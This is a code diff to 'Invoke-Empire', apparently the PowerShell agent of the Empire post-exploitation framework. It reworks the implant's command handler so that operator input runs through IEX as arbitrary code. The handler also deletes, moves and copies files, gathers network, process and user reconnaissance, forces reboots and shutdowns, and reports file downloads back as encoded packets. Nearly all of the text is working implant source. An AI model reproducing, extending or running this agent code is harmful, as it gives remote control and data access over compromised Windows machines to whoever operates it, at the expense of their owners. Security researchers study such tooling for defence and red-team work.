@@ -239,140 +239,157 @@ function Invoke-Empire {
     function Invoke-ShellCommand {
         param($cmd, $cmdargs="")
 
-        # extract the command and arguments
-        $parts = $cmd.split(" ")
-        $cmd = $parts[0]
-        if ($parts.length -ne 1){
-            $cmdargs = $parts[1..$parts.length] -join " "
-            # if this is a UNC path, forget the fancy formatting so we can get the stupid path to work
-            if ($cmdargs.contains("\\")){
-                $cmdargs = $cmdargs.trim("`"").trim("'")
-                $cmdargs = "$cmdargs"
-            }
+        if ($cmdargs.StartsWith("\\")) {
+            # UNC path normalization for PowerShell
+            $cmdargs = "FileSystem::$cmdargs"
         }
 
         $output = ""
-        switch -regex ($cmd){
-            '(ls|dir)' {
-                if ($cmdargs.length -eq ""){
-                    $output = Get-ChildItem -force | select lastwritetime,length,name
-                }
-                else {
-                    try{
-                        if ($cmdargs.StartsWith("\\")) {
-                            $output = Get-ChildItem -force -path "FileSystem::$cmdargs" -ErrorAction Stop | select lastwritetime,length,name    
-                        }
-                        else {
+        if ($cmd.ToLower() -eq "shell") {
+            # if we have a straight 'shell' command, skip the aliases
+            if ($cmdargs.length -eq ""){ $output = "no shell command supplied" }
+            else { $output = IEX "$cmdargs" }
+        }
+        else {
+            switch -regex ($cmd) {
+                '(ls|dir)' {
+                    if ($cmdargs.length -eq "") {
+                        $output = Get-ChildItem -force | select lastwritetime,length,name
+                    }
+                    else {
+                        try{
                             $output = Get-ChildItem -force -path "$cmdargs" -ErrorAction Stop | select lastwritetime,length,name
                         }
-                    }
-                    catch [System.Management.Automation.ActionPreferenceStopException]{
-                        $output = "[!] Error: $_ (or cannot be accessed)."
-                    }
-                }
-            }
-            '(rm|del|rmdir)' { 
-                if ($cmdargs.length -ne ""){ 
-                    try {
-                        Remove-Item -Force -Recurse $cmdargs -ErrorAction Stop;
-                        $output = "$cmdargs deleted"
-                    } 
-                    catch {
-                        $output=$_.Exception;
-                    }
-                }
-            }
-            pwd { $output = pwd }
-            cat { if ($cmdargs.length -ne ""){ $output = cat $cmdargs }}
-            cd { 
-                if ($cmdargs.length -ne "")
-                { 
-                    cd $cmdargs
-                    $output = pwd
-                }
-            }
-            mkdir { if ($cmdargs.length -ne ""){ $output = mkdir $cmdargs }}
-            mv { if ($cmdargs.length -ne ""){ $output = mv $cmdargs }}
-            arp { $output = arp -a }
-            netstat { $output = netstat -a }
-            '(ipconfig|ifconfig)' {
-                $output = Get-WmiObject -class "Win32_NetworkAdapterConfiguration" | ? {$_.IPEnabled -Match "True"} | % {
-                    $out = New-Object psobject
-                    $out | Add-Member Noteproperty 'Description' $_.Description
-                    $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress
-                    $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled
-                    $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",")
-                    $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",")
-                    $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",")
-                    $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",")
-                    $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName
-                    $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",")
-                    $out
-                } | fl | Out-String | %{$_ + "`n"}
-            }
-            # this is stupid how complicated it is to get this information...
-            '(ps|tasklist)' { 
-                $owners = @{}
-                Get-WmiObject win32_process | % {$o = $_.getowner(); if(-not $($o.User)){$o="N/A"} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
-                if($cmdargs -ne "") { $p = $cmdargs }
-                else{ $p = "*" }
-                $output = Get-Process $p | % {
-                    $arch = "x64"
-                    if ([System.IntPtr]::Size -eq 4){
-                        $arch = "x86"
-                    }
-                    else{
-                        foreach($module in $_.modules) {
-                            if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
-                                $arch = "x86"
-                                break
-                            }
+                        catch [System.Management.Automation.ActionPreferenceStopException] {
+                            $output = "[!] Error: $_ (or cannot be accessed)."
                         }
                     }
-                    $out = New-Object psobject
-                    $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName
-                    $out | Add-Member Noteproperty 'PID' $_.ID
-                    $out | Add-Member Noteproperty 'Arch' $arch
-                    $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()]
-                    $mem = "{0:N2} MB" -f $($_.WS/1MB)
-                    $out | Add-Member Noteproperty 'MemUsage' $mem
-                    $out
-                } | Sort-Object -Property PID
-            }
-            getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
-            route {
-                if (($cmdargs.length -eq "") -or ($cmdargs.lower() -eq "print")){ 
-                    # build a table of adapter interfaces indexes -> IP address for the adapater
-                    $adapters = @{}
-                    Get-WmiObject Win32_NetworkAdapterConfiguration | %{ $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress }
-                    $output = Get-WmiObject win32_IP4RouteTable | %{
+                }
+                '(rm|del|rmdir)' { 
+                    if ($cmdargs.length -ne "") { 
+                        try {
+                            Remove-Item -Force -Recurse "$cmdargs" -ErrorAction Stop;
+                            $output = "$cmdargs deleted"
+                        } 
+                        catch {
+                            $output=$_.Exception;
+                        }
+                    }
+                }
+                '(mv|move)' {
+                    if ($cmdargs.length -ne "") { 
+                        try {
+                            $parts = $cmdargs.split(" ")
+                            $source = $parts[0..$($parts.length-2)] -join " "
+                            $dest = $parts[-1]
+                            Move-Item -LiteralPath $source -Destination $dest -Force -ErrorAction Stop
+                            $output = "$source moved to $dest"
+                        } 
+                        catch {
+                            $output=$_.Exception;
+                        }
+                    }                    
+                }
+                '(copy|cp)' {
+                    if ($cmdargs.length -ne "") { 
+                        try {
+                            $parts = $cmdargs.split(" ")
+                            $source = $parts[0..$($parts.length-2)] -join " "
+                            $dest = $parts[-1]
+                            Copy-Item -LiteralPath $source -Destination $dest -Force -ErrorAction Stop
+                            $output = "$source copied to $dest"
+                        } 
+                        catch {
+                            $output=$_.Exception;
+                        }
+                    }                    
+                }
+                cd { 
+                    if ($cmdargs.length -ne "")
+                    { 
+                        cd $cmdargs
+                        $output = pwd
+                    }
+                }
+                '(ipconfig|ifconfig)' {
+                    $output = Get-WmiObject -class "Win32_NetworkAdapterConfiguration" | ? {$_.IPEnabled -Match "True"} | % {
                         $out = New-Object psobject
-                        $out | Add-Member Noteproperty 'Destination' $_.Destination
-                        $out | Add-Member Noteproperty 'Netmask' $_.Mask
-                        if ($_.NextHop -eq "0.0.0.0"){
-                            $out | Add-Member Noteproperty 'NextHop' "On-link"
+                        $out | Add-Member Noteproperty 'Description' $_.Description
+                        $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress
+                        $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled
+                        $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",")
+                        $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",")
+                        $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",")
+                        $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",")
+                        $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName
+                        $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",")
+                        $out
+                    } | fl | Out-String | %{$_ + "`n"}
+                }
+                # this is stupid how complicated it is to get this information...
+                '(ps|tasklist)' { 
+                    $owners = @{}
+                    Get-WmiObject win32_process | % {$o = $_.getowner(); if(-not $($o.User)){$o="N/A"} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
+                    if($cmdargs -ne "") { $p = $cmdargs }
+                    else{ $p = "*" }
+                    $output = Get-Process $p | % {
+                        $arch = "x64"
+                        if ([System.IntPtr]::Size -eq 4){
+                            $arch = "x86"
                         }
                         else{
-                            $out | Add-Member Noteproperty 'NextHop' $_.NextHop
+                            foreach($module in $_.modules) {
+                                if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
+                                    $arch = "x86"
+                                    break
+                                }
+                            }
                         }
-                        if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")){
-                            $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join ",")
-                        }
-                        else {
-                            $out | Add-Member Noteproperty 'Interface' '127.0.0.1'
-                        }
-                        $out | Add-Member Noteproperty 'Metric' $_.Metric1
+                        $out = New-Object psobject
+                        $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName
+                        $out | Add-Member Noteproperty 'PID' $_.ID
+                        $out | Add-Member Noteproperty 'Arch' $arch
+                        $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()]
+                        $mem = "{0:N2} MB" -f $($_.WS/1MB)
+                        $out | Add-Member Noteproperty 'MemUsage' $mem
                         $out
-                    } | ft -autosize | Out-String
+                    } | Sort-Object -Property PID
                 }
-                else { $output = route $cmdargs }
-            }
-            '(whoami|getuid)' { [Security.Principal.WindowsIdentity]::GetCurrent().Name }
-            '(reboot|restart)' { Restart-Computer -force }
-            shutdown { Stop-Computer -force }
-            default {
-                if ($cmdargs.length -eq ""){ $output = IEX $cmd }
-                else { $output = IEX "$cmd $cmdargs" }
+                getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
+                route {
+                    if (($cmdargs.length -eq "") -or ($cmdargs.lower() -eq "print")){ 
+                        # build a table of adapter interfaces indexes -> IP address for the adapater
+                        $adapters = @{}
+                        Get-WmiObject Win32_NetworkAdapterConfiguration | %{ $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress }
+                        $output = Get-WmiObject win32_IP4RouteTable | %{
+                            $out = New-Object psobject
+                            $out | Add-Member Noteproperty 'Destination' $_.Destination
+                            $out | Add-Member Noteproperty 'Netmask' $_.Mask
+                            if ($_.NextHop -eq "0.0.0.0"){
+                                $out | Add-Member Noteproperty 'NextHop' "On-link"
+                            }
+                            else{
+                                $out | Add-Member Noteproperty 'NextHop' $_.NextHop
+                            }
+                            if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")){
+                                $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join ",")
+                            }
+                            else {
+                                $out | Add-Member Noteproperty 'Interface' '127.0.0.1'
+                            }
+                            $out | Add-Member Noteproperty 'Metric' $_.Metric1
+                            $out
+                        } | ft -autosize | Out-String
+                    }
+                    else { $output = route $cmdargs }
+                }
+                '(whoami|getuid)' { [Security.Principal.WindowsIdentity]::GetCurrent().Name }
+                '(reboot|restart)' { Restart-Computer -force }
+                shutdown { Stop-Computer -force }
+                default {
+                    if ($cmdargs.length -eq ""){ $output = IEX $cmd }
+                    else { $output = IEX "$cmd $cmdargs" }
+                }
             }
         }
         "`n"+($output | Format-Table -wrap | Out-String)
@@ -700,7 +717,6 @@ function Invoke-Empire {
                     Encode-Packet -type 40 -data "[*] File download of $path completed"
                 }
                 catch{
-                    # Write-Host "Error: $_"
                     Encode-Packet -type 0 -data "file does not exist or cannot be accessed"
                 }
             }
